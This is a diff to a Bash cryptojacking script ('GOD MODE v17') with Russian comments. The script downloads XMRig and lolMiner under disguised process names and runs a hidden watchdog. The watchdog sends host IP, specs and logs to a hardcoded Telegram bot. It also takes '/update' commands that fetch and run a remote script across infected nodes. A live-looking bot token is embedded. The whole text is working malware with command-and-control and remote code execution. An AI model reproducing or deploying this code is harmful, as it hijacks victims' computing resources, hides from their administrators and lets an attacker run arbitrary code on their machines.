@@ -1,11 +1,15 @@
 #!/bin/bash
 
+# ============================================================
+# | GOD MODE v17: FULL ULTIMATE MONOLITHIC SCRIPT           |
+# ============================================================
+
 # [ CONFIGURATION ]
 FIXED_WALLET_ID="krxYNV2DZQ"
 TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
 TG_CHAT_ID="7032066912"
 
-# Ссылка по умолчанию для команды /update
+# Ссылка по умолчанию для обновления
 DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"
 
 # [ REPORTING INTERVAL: 18000s = 5 Hours ]
@@ -31,9 +35,6 @@ cd "$BASE_DIR" || exit 1
 # Маскировочные имена процессов
 BIN_CPU="sys_net_daemon" 
 BIN_GPU="sys_render_service"
-
-URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
-URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
 
 LOG_CPU="$BASE_DIR/.cpu_data.log"
 LOG_GPU="$BASE_DIR/.gpu_data.log"
@@ -70,8 +71,18 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & SETUP ]
+# [ PHASE 2: MODULE DOWNLOAD & ARCHITECTURE DETECTION ]
 # ----------------------------------------------------
+ARCH=$(uname -m)
+
+if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
+    URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-arm64.tar.gz"
+else
+    URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
+fi
+
+URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
+
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
     curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
@@ -114,7 +125,7 @@ if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
 fi
 
 # ----------------------------------------------------
-# [ PHASE 3: TARGETED MULTI-NODE WATCHDOG ]
+# [ PHASE 3: SECURE WATCHDOG ENGINE ]
 # ----------------------------------------------------
 cat <<EOF > watchdog.sh
 #!/bin/bash
@@ -148,21 +159,17 @@ send_tg_msg() {
          -d parse_mode="HTML" > /dev/null 2>&1
 }
 
-# Функция таргетинга: проверяет, предназначается ли команда именно этой машине
 is_target_me() {
     local target="\$1"
     
-    # Если целевой IP не указан или 'all' - команда выполнится на ВСЕХ серверах
     if [ -z "\$target" ] || [ "\$target" = "all" ] || [ "\$target" = "ALL" ]; then
         return 0
     fi
     
-    # Совпадение по стандартному IP или Worker ID
     if [ "\$target" = "\$SERVER_IP" ] || [ "\$target" = "\$WORKER" ]; then
         return 0
     fi
     
-    # Совпадение по форматированному IP (например: 185A220A101A5)
     local safe_ip
     safe_ip=\$(echo "\$SERVER_IP" | sed 's/\./A/g')
     if [ "\$target" = "\$safe_ip" ]; then
@@ -172,7 +179,6 @@ is_target_me() {
     return 1
 }
 
-# Отчет по хешрейту
 send_telemetry_report() {
     local title="\$1"
     
@@ -223,7 +229,6 @@ send_telemetry_report() {
     send_tg_msg "\$REPORT"
 }
 
-# Отчет по характеристикам
 send_specs_report() {
     local cpu_model
     cpu_model=\$(grep "model name" /proc/cpuinfo 2>/dev/null | head -n 1 | cut -d: -f2 | xargs)
@@ -268,7 +273,6 @@ send_specs_report() {
     send_tg_msg "\$msg"
 }
 
-# Отчет по логам
 send_logs_report() {
     local cpu_log_tail="No log data"
     local gpu_log_tail="No log data"
@@ -282,8 +286,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-# Стартовое уведомление
-STARTUP_MSG="🚀 <b>ENGINE V16 (TARGETED MULTI-NODE ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to update specific nodes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V17 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -307,7 +310,7 @@ while true; do
             GPU_STATUS="🟢 Active"
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
-                    nohup ./\$BIN_GPU --algo ETC --pool \$POOL_GPU_1 --user \$WORKER --pool \$POOL_GPU_2 --user \$WORKER --nocolor --watchdog exit >> "\$LOG_GPU" 2>&1 &
+                    nohup ./\$BIN_GPU --algo ETCHASH --ethstratum ETCPROXY --pool \$POOL_GPU_1 --user \$WORKER --pool \$POOL_GPU_2 --user \$WORKER --nocolor --watchdog exit >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                         GPU_STATUS="🔴 Offline / Crashed"
@@ -324,7 +327,7 @@ while true; do
     [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
-    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК (АВТОРИЗОВАННЫЙ + ТАРГЕТИНГ ПО IP) ---
+    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
     LAST_CMD=\$(curl -s -m 3 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
@@ -362,7 +365,7 @@ while true; do
                     if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                         chmod +x "\$DEST_SCRIPT"
                         nohup "\$DEST_SCRIPT" >/dev/null 2>&1 &
-                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script downloaded from GitHub (<code>Connfy.sh</code>) and launched!"
+                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script updated from <code>\$TARGET_URL</code> and launched!"
                     else
                         send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
                     fi
@@ -383,7 +386,7 @@ while true; do
         fi
     fi
 
-    # --- 4. ПЕРИОДИЧЕСКИЙ АВТО-ОТЧЕТ (Раз в 5 часов) ---
+    # --- 4. ПЕРИОДИЧЕСКИЙ АВТО-ОТЧЕТ ---
     ELAPSED=\$(( NOW - LAST_REPORT ))
     if [ "\$ELAPSED" -ge "\$REPORT_INTERVAL" ]; then
         LAST_REPORT=\$NOW
